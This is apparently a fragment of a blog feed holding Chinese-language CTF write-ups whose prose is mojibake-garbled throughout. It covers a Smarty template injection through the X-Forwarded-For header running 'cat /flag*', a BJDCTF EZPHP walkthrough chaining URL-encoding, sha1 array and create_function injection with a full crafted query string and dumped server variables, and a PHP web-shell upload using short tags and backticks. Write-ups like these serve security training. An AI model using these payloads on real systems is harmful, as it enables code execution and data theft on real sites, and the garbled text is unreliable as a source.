        <content type="html"><![CDATA[<p>&lt;â€“moreâ€“&gt;</p><p>Smartyæ˜¯ä¸€ä¸ªPHPçš„æ¨¡æ¿å¼•æ“ï¼Œæä¾›è®©ç¨‹åºä¸é¡µé¢åˆ†ç¦»çš„ä½œç”¨</p><p><img src="1.PNG"></p><p>è¿™é“é¢˜ç›®å¾ˆå®¹æ˜“çŒœå‡ºï¼Œæˆ‘ä»¬çš„ipå—xxfçš„æ§åˆ¶</p><p>å°†xxfæ”¹ä¸ºï¼š{system(â€˜cat /flag*â€™)}</p><p>éœ€è¦è®°å¾—ï¼Œåœ¨æ‰“å¼€ä¸€ä¸ªé¢˜ç›®çš„æ—¶å€™ï¼Œä¸€å®šè¦å¥½å¥½çš„çœ‹ä¸€ä¸‹å®ƒæ˜¯ç”±ä»€ä¹ˆæ„æˆçš„ï¼Œè¿™æ„æˆé‡Œé¢æœ‰æ²¡æœ‰æ¼æ´</p><p>ä½†æ˜¯ç¡®å®åœ¨XFFé‡Œé¢è¿›è¡ŒSSTIæˆ‘è¿˜æ˜¯æ²¡æœ‰æƒ³åˆ°çš„ï¼Œåšçš„æ—¶å€™å°±åœ¨æƒ³æ—¢ç„¶ipå¯ä»¥è¾“å‡ºæ¥ä¿¡æ¯ï¼Œé‚£ä¹ˆæˆ‘è¯¥æ€ä¹ˆæ•´å†èƒ½è¿›è¡Œå‘½ä»¤æ‰§è¡Œå‘¢ï¼Ÿæœ¬æ¥æƒ³é‡‡ç”¨æ‹¼æ¥å¤«è¿›è¡Œæ‹¼æ¥ï¼Œå°±æ˜¯ip=127â€¦;lsä½†æ˜¯ä¸å¯¹ã€‚ã€‚ã€‚</p><p><a href="https://blog.csdn.net/qq_45521281/article/details/107556915">https://blog.csdn.net/qq_45521281/article/details/107556915</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF-EZPHP</title>
      <link href="/2021/06/21/BJDCTF-EZPHP/"/>
      <url>/2021/06/21/BJDCTF-EZPHP/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><p>åœ¨Bç«™ä¸Šçœ‹åˆ°æœ‰ä½UPä¸»è®²è¿™ä¸ªé¢˜ç›®ï¼Œå°±æ¥åšåšçœ‹ï¼Œè¿™ä¸€é“é¢˜ç›®æ„Ÿè§‰å­¦åˆ°äº†å¥½å¤šçŸ¥è¯†</p><span id="more"></span><h2>å‰ç½®çŸ¥è¯†</h2><h3>$_SERVER[QUERY_STRING]</h3><p><img src="1.PNG"></p><p>è¾“å‡ºä½ çš„æŸ¥è¯¢è¯­å¥ï¼Œç‰¹æ€§å°±æ˜¯severä¸ä¼šå¯¹query_stringè¿›è¡Œç¼–ç ï¼Œä½†æ˜¯requestä¼š</p><p>æ‰€ä»¥å½“è¿™é“é¢˜ç›®æ¶‰åŠäº†</p><pre><code>if (    preg_match(&#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#39;|log/i&#39;, $_SERVER[&#39;QUERY_STRING&#39;])    )      die(&#39;You seem to want to do something bad?&#39;);</code></pre><p>æˆ‘ä»¬å¯ä»¥è¿›è¡Œurlç¼–ç </p><h3>preg_match</h3><p>å¿½ç•¥æ¢è¡Œç¬¦åŒ¹é…</p><p><img src="2.PNG"></p><h3>REQUESTè¶…å…¨å±€æ•°ç»„åœ°å†²çª</h3><p>REQUESTæ˜¯è®²GETä¸POSTåœ°ä¿¡æ¯èåˆåœ¨ä¸€èµ·å½¢æˆä¸€ä¸ªå¤§çš„æ•°ç»„ï¼Œå½“POSTä¸GETæäº¤åœ°æ˜¯é‡å¤åœ¨ä¸€èµ·åœ°æ—¶å€™ï¼Œæ ¹æ®PHPé…ç½®æ–‡ä»¶åœ°ä¿¡æ¯ï¼ŒPOSTæäº¤åœ°æ•°æ®å°†ä¼šè¦†ç›–GET</p><p><img src="3.PNG"></p><H3>data://text/plainçš„ä¼ªåè®®çš„åˆ©ç”¨</H3><p>ä¸file_put_contentçš„ä¸€åŒåˆ©ç”¨</p><p><img src="4.PNG"></p><p>æˆ‘ä»¬çŸ¥é“file_put_contentsï¼ˆ$aï¼‰ï¼Œåº”è¯¥æ˜¯ä¸€ä¸ªæ–‡ä»¶çš„åç§°ï¼Œä½†æ˜¯åœ¨è¿™ä¸ªé‡Œé¢æˆ‘ä»¬çš„$hå°±åªæ˜¯ä¸€å¥è¯ï¼Œå°±æˆåŠŸçš„å°†è¦æ±‚çš„è¯­å¥è¯»äº†å‡ºæ¥</p><h3>sha1å‡½æ•°çš„ç»•è¿‡</h3><p>sha1å‡½æ•°æ˜¯ä¸€ä¸ªå“ˆå¸ŒåŠ å¯†</p><p><img src="5.PNG"></p><p><img src="6.PNG"></p><p>æ³¨æ„ä¸€ä¸‹ï¼Œa[]=1&amp;&amp;b[]=2ï¼Œä¸¤ä¸ªçš„å€¼ä¸èƒ½ç›¸ç­‰</p><h3>create_functionä»£ç æ³¨å…¥</h3><p><img src="7.PNG"></p><p>create_function(â€˜$aâ€™,â€™$a=$a+1;â€™)(ç¬¬ä¸€ä¸ªå‚æ•°è¦åŠ å¼•å·)</p><p>ç„¶åå½“æˆ‘ä»¬æƒ³è¿›è¡Œæ¶æ„æ³¨å…¥çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥å°†å‰è€…é—­åˆã€</p><p><img src="8.PNG"></p><p><img src="9.PNG"></p><p>//æ˜¯å•è¡Œæ³¨é‡Šï¼Œæ‰€ä»¥å®ƒæ­£å¥½æ³¨é‡Šæ‰äº†å¤šä½™çš„}</p><h2>è§£é¢˜</h2><p><img src="10.PNG"></p><p>u1s1æˆ‘çœŸçš„è¶…çˆ±å®ƒè¿™è¿™å¼ å›¾ï¼Œå•¥æ—¶å€™æˆ‘ä¹Ÿå¯ä»¥å†™å‡ºæ¥è¿™ç§ä»£ç ã€‚ã€‚ã€‚</p><p>ctrl+uæ£€æŸ¥æºä»£ç ï¼Œå‘ç°</p><p><img src="11.PNG"></p><p>baseå˜›ï¼Œ64è§£ä¸å‡ºæ¥å°±æ¢æˆäº†32ï¼Œåœ¨ç™¾åº¦ä¸Šæœç´¢base32è§£ç ï¼Œè§£å‡ºæ¥1nD3x.phpï¼Œè¿™å°±æ˜¯æºç æ‰€åœ¨</p><p>xswlï¼Œæˆ‘è¿˜æƒ³è¯´æœ‰æ²¡æœ‰å¯èƒ½æ˜¯?page=1nD3x.php,æ¯•ç«Ÿäººå®¶è¯´çš„æ˜¯çœŸæ­£çš„é¡µé¢æ‰€åœ¨ã€‚ã€‚å®è·µè¯æ˜æ˜¯é”™çš„ï¼Œå°±ç›´æ¥åœ¨urlä¸Šæ·»åŠ </p><p>æºç åˆ†æï¼š</p><p>æœ‰å››ä¸ªå‚æ•°ï¼Œshana,paswd,arg,code</p><pre><code>if($_SERVER) &#123; if (    preg_match(&#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#39;|log/i&#39;, $_SERVER[&#39;QUERY_STRING&#39;])    )      die(&#39;You seem to want to do something bad?&#39;); &#125; </code></pre><p>å¦‚æœå®ƒæ£€æŸ¥åˆ°æˆ‘ä»¬ä¼ å…¥å‚æ•°ä»¥åŠå‚æ•°çš„å€¼å«æœ‰è¿™äº›å…ƒç´ ï¼Œå°±æ˜¯é€€å‡ºä»£ç </p><p>è¿™ä¸ªæ˜¯è¡¨æ˜æˆ‘ä»¬åœ¨æ¥ä¸‹æ¥è¿›è¡Œæ‰€æœ‰çš„ä¼ å‚éƒ½è¦å…ˆé€šè¿‡å®ƒè¿™ä¸€å…³æ‰å¯ä»¥ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿›è¡Œä¼ å‚çš„æ—¶å€™æ ¹æ®å‰é¢è®²çš„è¦è¿›è¡Œurlç¼–ç ï¼Œæ³¨æ„&amp;ä¸=ä¸èƒ½è¿›è¡Œç¼–ç </p><pre><code>if (!preg_match(&#39;/http|https/i&#39;, $_GET[&#39;file&#39;])) &#123;if (preg_match(&#39;/^aqua_is_cute$/&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !== &#39;aqua_is_cute&#39;) &#123;     $file = $_GET[&quot;file&quot;];     echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;&#125; &#125; else die(&#39;fxck you! What do you want to do ?!&#39;); </code></pre><p>ç¬¬ä¸€fileé‡Œé¢ä¸èƒ½å¤Ÿå«æœ‰http,httpsè€Œä¸”debuï¼==aqua_is_cuteï¼Œä½†æ˜¯è¿˜è¦è¢«åŒ¹é…åˆ°ï¼Œè¿™æ ·æˆ‘ä»¬æ‰èƒ½å°†æˆ‘ä»¬çš„å€¼èµ‹å€¼ç»™file</p><pre><code>if($_REQUEST) &#123; foreach($_REQUEST as $value) &#123;     if(preg_match(&#39;/[a-zA-Z]/i&#39;, $value))          die(&#39;fxck you! I hate English!&#39;); &#125; &#125; </code></pre><p>å¦‚æœå°†REQUESTæäº¤çš„å€¼è¿›è¡Œéå†ï¼Œå¦‚æœé‡Œé¢åŒ…å«æœ‰è‹±æ–‡å­—æ¯ï¼Œåˆ™åå‡ºä»£ç </p><p>æˆ‘ä»¬çŸ¥é“ï¼Œå³ä½¿æˆ‘ä»¬åœ¨æäº¤å‚æ•°çš„æ—¶å€™ä½¿ç”¨äº†urlç¼–ç ï¼Œä½†æ˜¯èµ‹ç»™REQUESTçš„å€¼ä»ç„¶æ˜¯è§£ç åçš„å€¼ï¼Œé‚£é‡Œé¢åŸºæœ¬éƒ½æ˜¯è‹±æ–‡å­—æ¯ï¼Œè‚¯å®šå®æƒ è¢«è§¦ç¢°çš„ã€‚ã€‚ã€‚ä½†æ˜¯æˆ‘ä»¬ä¸Šè¿°ä¹Ÿè¯´äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨POSTè¿›è¡Œè¦†ç›–</p><pre><code>if (file_get_contents($file) !== &#39;debu_debu_aqua&#39;)die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&quot;);</code></pre><p>$fileé‡Œé¢çš„å€¼å¦‚æœä¸æ˜¯debu_debu_aquaï¼Œåˆ™é€€å‡ºç¨‹åºï¼Œæ ¹æ®ä¸Šè¿°æˆ‘ä»¬å¯ä»¥é‡‡ç”¨data://text/plainä¼ªåè®®</p><pre><code>if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;extract($_GET[&quot;flag&quot;]);echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;&#125; else&#123;die(&quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&quot;);&#125; </code></pre><p>å¦‚æœshanaä¸paswdçš„å€¼ä¸ç›¸åŒä½†æ˜¯å®ƒä»¬çš„sha1å€¼ç›¸åŒï¼Œå°±æ‰§è¡Œextractå‡½æ•°ï¼Œä¼šè¦†ç›–åŸæœ‰çš„å€¼ï¼Œextractæ˜¯å°†æ•°ç»„é‡Œçš„å€¼æ‹†å‡ºæ¥ç„¶åè¿›è¡Œæ‰“æ•£</p><pre><code>if(preg_match(&#39;/^[a-z0-9]*$/isD&#39;, $code) || preg_match(&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#39;, $arg) ) &#123; die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag =w=&quot;); &#125; else &#123; include &quot;flag.php&quot;;$code(&#39;&#39;, $arg); &#125; ?&gt;</code></pre><p>å…¶å®çœ‹åˆ°codeï¼Œè·Ÿargåº”è¯¥å¯ä»¥æƒ³åˆ°ä¸€äº›ä¸œè¥¿</p><p><img src="12.PNG"></p><p>codeæ˜¯ä»£ç çš„æ„æ€ï¼Œargå°±æ˜¯ä¼ å‚çš„å‚æ•°ï¼ˆè¿™ç‚¹æ˜¯æˆ‘ççŒœçš„ï¼‰</p><p>ç¬¬ä¸€å‡ºç°äº†extractï¼Œå¹¶ä¸”codeè·Ÿargåœ¨ä»£ç çš„å‰é¢éƒ½è¢«èµ‹äºˆäº†åˆå€¼ä¸ºç©ºï¼Œå¾ˆæ˜æ˜¾æˆ‘ä»¬è¦ä¼ å…¥flag[code]ä¸flag[arg]è¿™ä¸¤ä¸ªå‚æ•°ï¼Œç„¶åæˆ‘ä»¬åˆå¯ä»¥çœ‹åˆ°$code(â€˜â€™, $arg)ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨create_functionè¿›è¡Œæ³¨å…¥ï¼Œé‡‡ç”¨}ä¸//</p><p>å› ä¸ºæˆ‘ä»¬æ˜¯é€šè¿‡argæ¥ä¼ é€’å‚æ•°çš„ï¼Œä½†æ˜¯argé‡Œé¢è¢«è¿‡æ»¤çš„ä¸œè¥¿å¤ªå¤šäº†ï¼Œå°±ä¸€èˆ¬çš„å‘½ä»¤æ‰§è¡Œä½œç”¨çš„å‡½æ•°éƒ½è¢«è¿‡æ»¤äº†</p><p><img src="13.PNG"></p><p>get_defined_vars() åœ¨ä¸æŒ‡å®šå˜é‡åç§°çš„æƒ…å†µä¸‹è¾“å‡ºå˜é‡çš„å€¼</p><p>æœ€åæˆ‘ä»¬æ„é€ </p><pre><code>debu=aqua_is_cute&amp;file=data://text/plain,debu_debu_aqua&amp;shana[]=1&amp;passwd[]=2&amp;flag[code]=create_function&amp;flag[arg]=&#125;var_dump(get_defined_vars());//</code></pre><p>åœ¨bpä¸Šè¿›è¡Œç¼–ç ï¼Œä½†æ˜¯ç”±äºbpæ˜¯å…¨ç¼–ç ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥åˆ©ç”¨ï¼Œå¿…éœ€å°†&amp;ï¼Œâ€˜%26â€™ï¼Œ=ï¼Œâ€˜%3dâ€™è¿›è¡Œæ›¿æ¢</p><p><img src="14.PNG"></p><pre><code>flagå°±åœ¨è¿™é‡Œï¼Œä½ èƒ½æ‹¿åˆ°å®ƒå—ï¼Ÿarray(13) &#123;  [&quot;_GET&quot;]=&gt;  array(5) &#123;[&quot;debu&quot;]=&gt;string(13) &quot;aqua_is_cute&quot;[&quot;file&quot;]=&gt;string(32) &quot;data://text/plain,debu_debu_aqua&quot;[&quot;shana&quot;]=&gt;array(1) &#123;  [0]=&gt;  string(1) &quot;1&quot;&#125;[&quot;passwd&quot;]=&gt;array(1) &#123;  [0]=&gt;  string(1) &quot;2&quot;&#125;[&quot;flag&quot;]=&gt;array(2) &#123;  [&quot;code&quot;]=&gt;  string(15) &quot;create_function&quot;  [&quot;arg&quot;]=&gt;  string(32) &quot;&#125;var_dump(get_defined_vars());//&quot;&#125;  &#125;  [&quot;_POST&quot;]=&gt;  array(2) &#123;[&quot;debu&quot;]=&gt;string(1) &quot;1&quot;[&quot;file&quot;]=&gt;string(1) &quot;1&quot;  &#125;  [&quot;_COOKIE&quot;]=&gt;  array(0) &#123;  &#125;  [&quot;_FILES&quot;]=&gt;  array(0) &#123;  &#125;  [&quot;_SERVER&quot;]=&gt;  array(55) &#123;[&quot;PHP_EXTRA_CONFIGURE_ARGS&quot;]=&gt;string(77) &quot;--enable-fpm --with-fpm-user=www-data --with-fpm-group=www-data --disable-cgi&quot;[&quot;HOSTNAME&quot;]=&gt;string(12) &quot;fa84b83443af&quot;[&quot;PHP_INI_DIR&quot;]=&gt;string(18) &quot;/usr/local/etc/php&quot;[&quot;SHLVL&quot;]=&gt;string(1) &quot;1&quot;[&quot;HOME&quot;]=&gt;string(14) &quot;/home/www-data&quot;[&quot;PHP_LDFLAGS&quot;]=&gt;string(34) &quot;-Wl,-O1 -Wl,--hash-style=both -pie&quot;[&quot;PHP_CFLAGS&quot;]=&gt;string(83) &quot;-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64&quot;[&quot;PHP_MD5&quot;]=&gt;string(0) &quot;&quot;[&quot;PHP_VERSION&quot;]=&gt;string(6) &quot;7.3.13&quot;[&quot;GPG_KEYS&quot;]=&gt;string(81) &quot;CBAF69F173A0FEA4B537F470D66C9593118BCCB6 F38252826ACD957EF380D39F2F7956BC5DA04B5D&quot;[&quot;PHP_CPPFLAGS&quot;]=&gt;string(83) &quot;-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64&quot;[&quot;PHP_ASC_URL&quot;]=&gt;string(62) &quot;https://www.php.net/get/php-7.3.13.tar.xz.asc/from/this/mirror&quot;[&quot;PHP_URL&quot;]=&gt;string(58) &quot;https://www.php.net/get/php-7.3.13.tar.xz/from/this/mirror&quot;[&quot;PATH&quot;]=&gt;string(60) &quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;[&quot;PHPIZE_DEPS&quot;]=&gt;string(78) &quot;autoconf         dpkg-dev dpkg         file         g++         gcc         libc-dev         make         pkgconf         re2c&quot;[&quot;PWD&quot;]=&gt;string(13) &quot;/var/www/html&quot;[&quot;PHP_SHA256&quot;]=&gt;string(64) &quot;57ac55fe442d2da650abeb9e6fa161bd3a98ba6528c029f076f8bba43dd5c228&quot;[&quot;FLAG&quot;]=&gt;string(4) &quot;null&quot;[&quot;USER&quot;]=&gt;string(8) &quot;www-data&quot;[&quot;HTTP_X_FORWARDED_PROTO&quot;]=&gt;string(4) &quot;http&quot;[&quot;HTTP_X_FORWARDED_FOR&quot;]=&gt;string(28) &quot;115.61.100.23, 115.61.100.23&quot;    [&quot;HTTP_UPGRADE_INSECURE_REQUEST    S&quot;]=&gt;string(1) &quot;1&quot;[&quot;HTTP_CONTENT_TYPE&quot;]=&gt;string(33) &quot;application/x-www-form-urlencoded&quot;[&quot;HTTP_CACHE_CONTROL&quot;]=&gt;string(9) &quot;max-age=0&quot;[&quot;HTTP_ACCEPT_LANGUAGE&quot;]=&gt;string(59) &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;[&quot;HTTP_ACCEPT_ENCODING&quot;]=&gt;string(13) &quot;gzip, deflate&quot;[&quot;HTTP_ACCEPT&quot;]=&gt;string(74) &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;[&quot;HTTP_CONTENT_LENGTH&quot;]=&gt;string(2) &quot;13&quot;[&quot;HTTP_USER_AGENT&quot;]=&gt;string(78) &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&quot;[&quot;HTTP_HOST&quot;]=&gt;string(51) &quot;839262d1-07be-4447-9dd3-7b966aeb3b9d.node3.buuoj.cn&quot;[&quot;SCRIPT_FILENAME&quot;]=&gt;string(23) &quot;/var/www/html/1nD3x.php&quot;[&quot;REDIRECT_STATUS&quot;]=&gt;string(3) &quot;200&quot;[&quot;SERVER_NAME&quot;]=&gt;string(9) &quot;localhost&quot;[&quot;SERVER_PORT&quot;]=&gt;string(2) &quot;80&quot;[&quot;SERVER_ADDR&quot;]=&gt;string(13) &quot;172.16.179.69&quot;[&quot;REMOTE_PORT&quot;]=&gt;string(5) &quot;51570&quot;[&quot;REMOTE_ADDR&quot;]=&gt;string(13) &quot;115.61.100.23&quot;[&quot;SERVER_SOFTWARE&quot;]=&gt;string(12) &quot;nginx/1.16.1&quot;[&quot;GATEWAY_INTERFACE&quot;]=&gt;string(7) &quot;CGI/1.1&quot;[&quot;REQUEST_SCHEME&quot;]=&gt;string(4) &quot;http&quot;[&quot;SERVER_PROTOCOL&quot;]=&gt;string(8) &quot;HTTP/1.1&quot;[&quot;DOCUMENT_ROOT&quot;]=&gt;string(13) &quot;/var/www/html&quot;[&quot;DOCUMENT_URI&quot;]=&gt;string(10) &quot;/1nD3x.php&quot;[&quot;REQUEST_URI&quot;]=&gt;string(430) &quot;/1nD3x.php?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61%5b%5d=%31&amp;%70%61%73%73%77%64%5b%5d=%32&amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d=%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f&quot;[&quot;SCRIPT_NAME&quot;]=&gt;string(10) &quot;/1nD3x.php&quot;[&quot;CONTENT_LENGTH&quot;]=&gt;string(2) &quot;13&quot;[&quot;CONTENT_TYPE&quot;]=&gt;string(33) &quot;application/x-www-form-urlencoded&quot;[&quot;REQUEST_METHOD&quot;]=&gt;string(4) &quot;POST&quot;[&quot;QUERY_STRING&quot;]=&gt;string(419) &quot;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61%5b%5d=%31&amp;%70%61%73%73%77%64%5b%5d=%32&amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d=%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f&quot;[&quot;FCGI_ROLE&quot;]=&gt;string(9) &quot;RESPONDER&quot;[&quot;PHP_SELF&quot;]=&gt;string(10) &quot;/1nD3x.php&quot;[&quot;REQUEST_TIME_FLOAT&quot;]=&gt;float(1624368403.8835)[&quot;REQUEST_TIME&quot;]=&gt;int(1624368403)[&quot;argv&quot;]=&gt;array(1) &#123;  [0]=&gt;  string(419) &quot;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61%5b%5d=%31&amp;%70%61%73%73%77%64%5b%5d=%32&amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d=%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f&quot;&#125;[&quot;argc&quot;]=&gt;int(1)  &#125;  [&quot;_REQUEST&quot;]=&gt;  array(5) &#123;[&quot;debu&quot;]=&gt;string(1) &quot;1&quot;[&quot;file&quot;]=&gt;string(1) &quot;1&quot;[&quot;shana&quot;]=&gt;array(1) &#123;  [0]=&gt;  string(1) &quot;1&quot;&#125;[&quot;passwd&quot;]=&gt;array(1) &#123;  [0]=&gt;  string(1) &quot;2&quot;&#125;[&quot;flag&quot;]=&gt;array(2) &#123;  [&quot;code&quot;]=&gt;  string(15) &quot;create_function&quot;  [&quot;arg&quot;]=&gt;  string(32) &quot;&#125;var_dump(get_defined_vars());//&quot;&#125;  &#125;  [&quot;file&quot;]=&gt;  string(32) &quot;data://text/plain,debu_debu_aqua&quot;  [&quot;shana&quot;]=&gt;  array(1) &#123;[0]=&gt;string(1) &quot;1&quot;  &#125;  [&quot;passwd&quot;]=&gt;  array(1) &#123;[0]=&gt;string(1) &quot;2&quot;  &#125;  [&quot;arg&quot;]=&gt;  string(32) &quot;&#125;var_dump(get_defined_vars());//&quot;  [&quot;code&quot;]=&gt;  string(15) &quot;create_function&quot;  [&quot;value&quot;]=&gt;  array(2) &#123;[&quot;code&quot;]=&gt;string(15) &quot;create_function&quot;[&quot;arg&quot;]=&gt;string(32) &quot;&#125;var_dump(get_defined_vars());//&quot;  &#125;  [&quot;ffffffff11111114ggggg&quot;]=&gt;  string(89) &quot;Baka, do you think it&#39;s so easy to get my flag? I hid the real flag in rea1fl4g.php 23333&quot;&#125;</code></pre><p>è¿™å°±æ˜¯å¾—åˆ°çš„å…¨éƒ¨çš„ç¯å¢ƒå˜é‡ï¼Œç„¶åæˆåŠŸçš„çŸ¥é“äº†flagå®åœ¨rea1fl4g.phpï¼Œç„¶åæˆ‘ä»¬å°è¯•åŒ…å«rea1fl4g.phpï¼Œç„¶åæˆ‘ä»¬ä½¿ç”¨requireï¼ˆï¼‰è¿›è¡ŒåŒ…å«ï¼Œä½†æ˜¯æ²¡æœ‰æˆåŠŸï¼Œä½¿ç”¨å–åã€‚</p><p><img src="15.PNG"></p><p>ä½†æ˜¯è¿˜æ˜¯æ²¡æœ‰ï¼Œå·¦åç”¨ä¸ºåè®®è¯»å–å¾—åˆ°</p><p><img src="16.PNG"></p><p>å› ä¸ºä½¿ç”¨unsetå°†flagé‡Šæ”¾ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½åœ¨é¡µé¢ä¸­ç›´æ¥è¯»å–åˆ°flagï¼Œåªèƒ½ä½¿ç”¨ä¸ºåè®®è¯»å–</p><p>bpæ‰§è¡ŒæˆåŠŸæ—¶å€™çš„</p><pre><code>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Type: application/x-www-form-urlencodedContent-Length: 6</code></pre><p>ç«Ÿç„¶æ˜¯cookieçš„é—®é¢˜ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p><p><img src="17.PNG"></p><p>ä¼šä¸ä¼šæ˜¯å› ä¸ºè¿™ä¸ª</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>çº¢æ˜è°·-writeshell</title>
      <link href="/2021/06/19/%E7%BA%A2%E6%98%8E%E8%B0%B7-writeshell/"/>
      <url>/2021/06/19/%E7%BA%A2%E6%98%8E%E8%B0%B7-writeshell/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><span id="more"></span><pre><code>&lt;?phperror_reporting(0);highlight_file(__FILE__);function check($input)&#123;if(preg_match(&quot;/&#39;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;,$input))&#123;    // if(preg_match(&quot;/&#39;| |_|=|php/&quot;,$input))&#123;    die(&#39;hacker!!!&#39;);&#125;else&#123;    return $input;&#125;&#125;function waf($input)&#123;if(is_array($input))&#123;    foreach($input as $key=&gt;$output)&#123;        $input[$key] = waf($output);    &#125;&#125;else&#123;    $input = check($input);&#125;&#125;$dir = &#39;sandbox/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &#39;/&#39;;if(!file_exists($dir))&#123;mkdir($dir);&#125;switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123;case &#39;pwd&#39;:    echo $dir;    break;case &#39;upload&#39;:    $data = $_GET[&quot;data&quot;] ?? &quot;&quot;;    waf($data);    file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);&#125;?&gt;</code></pre><p>å…¶å®æŒºç®€å•çš„ï¼ŒæŠŠshellå†™è¿›å»å°±å¥½äº†</p><p>å› ä¸ºè¿‡æ»¤äº†phpï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨çŸ­æ ‡ç­¾ï¼Œè¿˜ç”¨åå¼•å·ï¼Œç„¶åå¯ä»¥ç›´æ¥å¿«ä¸€ç‚¹çš„ä½¿ç”¨    </p><p>/tå¯ä»¥ä»£æ›¿ç©ºæ ¼</p><pre><code>    &lt;?=`ls\t/*`?&gt;</code></pre><p>#åæ€</p><p>emmmï¼Œè¿™é“é¢˜ç›®æˆ‘æƒ³åˆ°äº†åå¼•å·ï¼ŒçŸ­æ ‡ç­¾ï¼Œå¡åˆ°äº†ç©ºæ ¼ä¸Šï¼Œä½¿ç”¨%09ï¼Œ%0cä¹‹ç±»çš„ï¼Œç„¶ååœ¨ç¾¤é‡Œé—®å¸ˆå‚…ä»¬ï¼ŒFç¥ç»™å‡ºäº†å¯ä»¥ä½¿ç”¨&lt;,ä»£æ›¿ç©ºæ ¼ï¼Œæˆ‘åœ¨kaliä¸Šä½¿ç”¨æ˜¯æˆåŠŸçš„ï¼Œä½†æ˜¯åœ¨è¿™é‡Œæ²¡æœ‰æˆåŠŸï¼Œæœ€ç»ˆçœ‹WPå­¦åˆ°äº†\t,å¦å¤–è¿˜æƒ³åˆ°äº†ï¼Œå…¶å®æˆ‘å¯ä»¥ç›´æ¥cat /*ä¸ç”¨åœ¨ä½¿ç”¨lsï¼Œå»æ‰¾æ–‡ä»¶äº†</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
